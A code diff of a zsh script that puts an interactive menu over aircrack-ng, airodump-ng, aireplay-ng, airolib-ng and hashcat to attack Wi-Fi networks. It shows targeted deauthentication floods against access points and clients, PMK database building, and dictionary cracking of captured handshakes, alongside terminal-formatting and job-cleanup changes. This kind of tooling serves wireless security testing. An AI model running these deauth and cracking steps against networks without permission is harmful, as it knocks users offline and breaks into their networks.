@@ -1,74 +1,74 @@
 #!/bin/zsh
 [[ ! -t 0 ]] && return 1;
 function box () {
-  ((# == 0)) && return 0;
-  local a d h B T H tl tr bl br th bh lv rv r w; integer s; s=1;
-  while getopts 's:h:B:T:H:' a; do case $a in
-    (s) # line style
-      ((OPTARG >= 1 && OPTARG < 5)) && s=$OPTARG;;
-    (h) # header
-      h=$OPTARG;;
-    (B) # box color
-      B="\033[;3$(pcre2grep -o1 '([0-7])' <<< $OPTARG || <<< 7)";
-      [[ $OPTARG =~ i ]] && B="${B};7";
-      [[ $OPTARG =~ b ]] && B="${B};1";
-      B="${B}m";;
-    (T) # text color
-      T="\033[;3$(pcre2grep -o1 '([0-7])' <<< $OPTARG || <<< 7)";
-      [[ $OPTARG =~ i ]] && T="${T};7";
-      [[ $OPTARG =~ b ]] && T="${T};1";
-      T="${T}m";;
-    (H) # header color
-      H="\033[;3$(pcre2grep -o1 '([0-7])' <<< $OPTARG || <<< 7)";
-      [[ $OPTARG =~ i ]] && H="${H};7";
-      [[ $OPTARG =~ b ]] && H="${H};1";
-      H="${H}m";;
-  esac; done;
+((# == 0)) && return 0;
+local a d h B T H tl tr bl br th bh lv rv r w; integer s; s=1;
+while getopts 's:h:B:T:H:' a; do case $a in
+  (s) # line style
+    ((OPTARG >= 1 && OPTARG < 5)) && s=$OPTARG;;
+  (h) # header
+    h=$OPTARG;;
+  (B) # box color
+    [[ $OPTARG =~ '[0-7]' ]] && B='\033[3'${MATCH} || B='\033[37';
+    [[ $OPTARG =~ 'i|I' ]]   && B="${B};7";
+    [[ $OPTARG =~ 'b|B' ]]   && B="${B};1";
+    B="${B}m";;
+  (T) # text color
+    [[ $OPTARG =~ '[0-7]' ]] && T='\033[3'${MATCH} || T='\033[37';
+    [[ $OPTARG =~ 'i|I' ]]   && T="${T};7";
+    [[ $OPTARG =~ 'b|B' ]]   && T="${T};1";
+    T="${T}m";;
+  (H) # header color
+    [[ $OPTARG =~ '[0-7]' ]] && H='\033[3'${MATCH} || H='\033[37';
+    [[ $OPTARG =~ 'i|I' ]]   && H="${H};7";
+    [[ $OPTARG =~ 'b|B' ]]   && H="${H};1";
+    H="${H}m";;
+esac; done;
 
-  tl=(┏ ┌ ╔ ⡏); tl=${tl[$s]}; # top left
-  bl=(┗ └ ╚ ⣇); bl=${bl[$s]}; # bottom left
-  tr=(┓ ┐ ╗ ⢹); tr=${tr[$s]}; # top right
-  br=(┛ ┘ ╝ ⣸); br=${br[$s]}; # bottom right
-  th=(━ ─ ═ ⠉); th=${th[$s]}; # top horizontal
-  bh=(━ ─ ═ ⣀); bh=${bh[$s]}; # bottom horizontal
-  lv=(┃ │ ║ ⡇); lv=${lv[$s]}; # left vertical
-  rv=(┃ │ ║ ⢸); rv=${rv[$s]}; # right vertical
-  r='\033[;0m';
-  # box inside width
-  w=0; for a in $@[OPTIND,-1]; do ((${(c)#a} > w)) && w=${(c)#a}; done; 
-  ((${+h:+1} && $#h > w)) && w=$#h && ((w+=2)); ((w+=2));
+tl=(┏ ┌ ╔ ⡏); tl=${tl[$s]}; # top left
+bl=(┗ └ ╚ ⣇); bl=${bl[$s]}; # bottom left
+tr=(┓ ┐ ╗ ⢹); tr=${tr[$s]}; # top right
+br=(┛ ┘ ╝ ⣸); br=${br[$s]}; # bottom right
+th=(━ ─ ═ ⠉); th=${th[$s]}; # top horizontal
+bh=(━ ─ ═ ⣀); bh=${bh[$s]}; # bottom horizontal
+lv=(┃ │ ║ ⡇); lv=${lv[$s]}; # left vertical
+rv=(┃ │ ║ ⢸); rv=${rv[$s]}; # right vertical
+r='\033[;0m';
+# box inside width
+w=0; for a in $@[OPTIND,-1]; do ((${(c)#a} > w)) && w=${(c)#a}; done; 
+((${+h:+1} && $#h > w)) && w=$#h && ((w+=2)); ((w+=2));
 
-  if ((w + 2 > COLUMNS)); then
-    # FIXME; IF HEADER MULTI ROW OR LONGER THAN COLUMNS ... ELSE
-    ((${+h:+1})) && printf '%b%s%s%b%s%b%s%s\n' $B $tl ${(pr.(COLUMNS-2-$#h)/2..$th.)th} $r$H $h $r$B ${(pr.(COLUMNS-2-$#h)/2+$#h+COLUMNS-2-($#h+COLUMNS-2)/2*2..$th.)th} $tr || printf '%b%s%s%s\n' $B $tl ${(pr.COLUMNS-3..$th.)th} $tr;
-    for a in $@[OPTIND,-1]; do 
-      for d in ${(f)"$(fmt -w $COLUMNS <<< $a)"}; do
-        printf '%s %b%s%b %s\n' $lv $r$T ${(r.COLUMNS-4.. .)d} $r$B $rv; 
-      done;
+if ((w + 2 > COLUMNS)); then;
+  # FIXME; IF HEADER MULTI ROW OR LONGER THAN COLUMNS ... ELSE
+  ((${+h:+1})) && printf '%b%s%s%b%s%b%s%s\n' $B $tl ${(pr.(COLUMNS-2-$#h)/2..$th.)th} $r$H $h $r$B ${(pr.(COLUMNS-2-$#h)/2+$#h+COLUMNS-2-($#h+COLUMNS-2)/2*2..$th.)th} $tr || printf '%b%s%s%s\n' $B $tl ${(pr.COLUMNS-3..$th.)th} $tr;
+  for a in $@[OPTIND,-1]; do 
+    for d in ${(f)"$(fmt -w $COLUMNS <<< $a)"}; do
+      printf '%s %b%s%b %s\n' $lv $r$T ${(r.COLUMNS-4.. .)d} $r$B $rv; 
     done;
-    printf '%s%s%s%b\n' $bl ${(pr.COLUMNS-2..$bh.)bh} $br $r;
-  else;
-    ((${+h:+1})) && printf '%b%s%s%b%s%b%s%s\n' $B $tl ${(pr.(w-$#h)/2..$th.)th} $r$H $h $r$B ${(pr.(w-$#h)/2+$#h+w-($#h+w)/2*2..$th.)th} $tr || printf '%b%s%s%s\n' $B $tl ${(pr.w-1..$th.)th} $tr;
-    for a in $@[OPTIND,-1]; do printf '%s %b%s%b %s\n' $lv $r$T ${(r.w-2.. .)a} $r$B $rv; done;
-    printf '%s%s%s%b\n' $bl ${(pr.w..$bh.)bh} $br $r;
-  fi;
+  done;
+  printf '%s%s%s%b\n' $bl ${(pr.COLUMNS-2..$bh.)bh} $br $r;
+else;
+  ((${+h:+1})) && printf '%b%s%s%b%s%b%s%s\n' $B $tl ${(pr.(w-$#h)/2..$th.)th} $r$H $h $r$B ${(pr.(w-$#h)/2+$#h+w-($#h+w)/2*2..$th.)th} $tr || printf '%b%s%s%s\n' $B $tl ${(pr.w-1..$th.)th} $tr;
+  for a in $@[OPTIND,-1]; do printf '%s %b%s%b %s\n' $lv $r$T ${(r.w-2.. .)a} $r$B $rv; done;
+  printf '%s%s%s%b\n' $bl ${(pr.w..$bh.)bh} $br $r;
+fi;
 }
 
 function menu () {
   typeset m t a;
   while getopts 'm:t:' a; do case $a in
   (m) 
-    m="\033[;3$(pcre2grep -o1 '([0-7])' <<< $OPTARG || <<< 7)";
-    [[ $OPTARG =~ i ]] && m="${m};7";
-    [[ $OPTARG =~ b ]] && m="${m};1";
+    [[ $OPTARG =~ '[0-7]' ]] && m='\033[0;3'${MATCH} || m='\033[0;37';
+    [[ $OPTARG =~ 'i|I' ]]   && m="${m};7";
+    [[ $OPTARG =~ 'b|B' ]]   && m="${m};1";
     m="${m}m";;
   (t)
-    t="\033[;3$(pcre2grep -o1 '([0-7])' <<< $OPTARG || <<< 7)";
-    [[ $OPTARG =~ i ]] && t="${t};7";
-    [[ $OPTARG =~ b ]] && t="${t};1";
+    [[ $OPTARG =~ '[0-7]' ]] && t='\033[0;3'${MATCH} || t='\033[0;37';
+    [[ $OPTARG =~ 'i|I' ]]   && t="${t};7";
+    [[ $OPTARG =~ 'b|B' ]]   && t="${t};1";
     t="${t}m";;
   esac; done;
-  for a in $@[OPTIND,-1]; do printf '%b%4s    %b%s%b\n' "${m:-\033];0m}" "${a%% *}" "${t:-\033[;0m}" "${a#* }" '\033[;0m'; done;
+  for a in $@[OPTIND,-1]; do printf '%b%4s    %b%s%b\n' "${m:-\033]0m}" "${a%% *}" "${t:-\033[0m}" "${a#* }" '\033[0m'; done;
 }
 
 function select-cap () {
@@ -115,11 +115,11 @@ function switch-mode () {
 function select-network () {
   ((${+essid})) && [[ $(read -seq 'Select another network? ') != y ]] && return 0;
   local l s d;
-  z=(${t}/*.kismet.csv) &>/dev/null;
+  z=(${t}/*.kismet.csv(.om));
   if ((${#z} > 0)); then
     if [[ $(read -seq '?Use previous dump? ') = y ]]; then
       dump=${$(fzf --preview-window=90%:down:wrap --reverse --preview='tr ";" "!" < {} | column -t -s "!" -o " "' <<< ${(F)z})%.kismet.csv};
-      [[ -z ${dump} ]] || local a;
+      [[ -z ${dump} ]] || { read -sk1 "?${n}Invalid selection." && local a };
     else;
       dump=$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8);
       [[ ${mode} != monitor ]] && switch-mode;
@@ -179,7 +179,7 @@ function aircrack-pmk-attack () {
       for s in ${sp}; do
         while true; do
           if (($(jobs | wc -l) < 8)); then;
-            { airolib-ng ${s}-DB --import passwd ${s}; rm ${s}; airolib-ng ${s}-DB --import essid ${essid}; airolib-ng ${s}-DB --batch; } &;
+            { airolib-ng ${s}-DB --import passwd ${s}; rm ${s}; airolib-ng ${s}-DB --import essid ${essid}; airolib-ng ${s}-DB --batch } &;
             break;
           else;
             sleep 60;
@@ -189,9 +189,11 @@ function aircrack-pmk-attack () {
     else;
       airolib-ng ${wl}-DB --import passwd ${wl}; airolib-ng ${wl}-DB --import essid ${essid}; airolib-ng ${wl}-DB --batch;
     fi;
-    while (($(jobs | wc -l) > 0)); do sleep 60; done;
+    while (($(jobs | wc -l | pcre2grep '  air') > 0)); do sleep 60; done;
   done;
-  for a in ./*-DB(.); do aircrack-ng -r ${a} ${cap}; done;
+  for a in ./*-DB(.); do 
+    aircrack-ng -r ${a} ${cap}; 
+  done;
   # aircrack-ng -r "$(printf '%s,' ./*-DB(.))" ${cap};
 }
 
@@ -203,9 +205,15 @@ function capture-packets () {
     '3 Specific channel and BSSID' \
     '* return';
   case $(read -sek1 "?${n}> ") in 
-    (1) airodump-ng -w $(pwd)/dump$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8) ${interface};;
-    (2) airodump-ng -c $(read -e '?[1--17]> ') -w $(pwd)/dump$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8) ${interface};;
-    (3) select-network || return 1;
+    (1) airodump-ng -w $(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8) ${interface};;
+    (2)
+      typeset -i channel;
+      until ((channel > 0 && channel < 18)); do;
+        read -r "channel?${n}Enter channel [1--17]> ";
+      done;
+      airodump-ng -c ${channel} -w ${(l.2..0.)channel}-$(cat /dev/urandom | tr -cd '[:alnum:]' | head -c 8) ${interface};;
+    (3) 
+      select-network || return 1;
       airodump-ng -c ${channel} -d ${bssid} -w ${essid} ${interface} &; sleep 1;
       if ((${#clients} == 0)); then;
         aireplay-ng -0 64 -a ${bssid} ${interface} &>/dev/null &;
@@ -213,7 +221,8 @@ function capture-packets () {
         local client; for client in ${clients}; do;
           aireplay-ng -0 64 -a ${bssid} -c ${client} ${interface} &>/dev/null &;
         done; 
-      fi;;
+      fi;
+      jobs -l | pcre2grep -o1 '^\[\d+\]  [+- ] (\d+) (?:\w+)  air(eplay|odump)-ng.+$' | xargs -d '\n' kill &>/dev/null || true;;
     (*) return;;
   esac;
 }
@@ -224,7 +233,7 @@ function aircrack-dict-attack () {
   if ((${#sesh} > 0)) && [[ $(read -seq "?${n}Resume dictionary attack? ") = y ]]; then
     sesh=$(fzy -l $LINES <<< ${(F)sesh});
     [[ -f ${sesh} ]] || return 1;
-    [[ ${sesh} =~ '\.bak$' ]] && [[ ! -f ${sesh%.bak} ]] && cp ${sesh} ${sesh%.bak} && sesh=${sesh%.bak};
+    [[ ${sesh} =~ '\.bak$' ]] && cp ${sesh} ${sesh%.bak} &>/dev/null && sesh=${sesh%.bak};
     trap "cp ${sesh} ${sesh}.bak &>/dev/null; return 2" INT;
     { sleep 10; while ps -C aircrack-ng &>/dev/null; do cp ${sesh} ${sesh}.bak &>/dev/null; sleep 300; done; } &;
     aircrack-ng -R ${sesh};
@@ -378,7 +387,7 @@ function hashcat-attack () {
       '5 select hash-type' \
       '6 options' \
       '7 run command' \
-      'q return';
+      '* return';
     case $(read -sek1 "?${n}> ") in
       (0) 
         [[ -n ${r[1]} ]] && hashcat --restore="$(fzy -l $LINES -i -p 'select session> ' <<< ${(F)r})" || read -sk1 '?No hashcat sessions found. ';;
@@ -477,7 +486,7 @@ function wep-wash-attack () {
 
 function quit () {
   cd ~; [[ ${mode} != managed ]] && switch-mode;
-  (( $(jobs | wc -l) != 0 )) && kill -9 $(jobs -p | awk '{printf $3}');
+  jobs -l | pcre2grep -o1 '^\[\d+\]  [+- ] (\d+) \w+  air(eplay|odump)-ng.+$' | xargs -d '\n' kill &>/dev/null || true;
   unset essid bssid mode channel power interface security cap;
 }
 
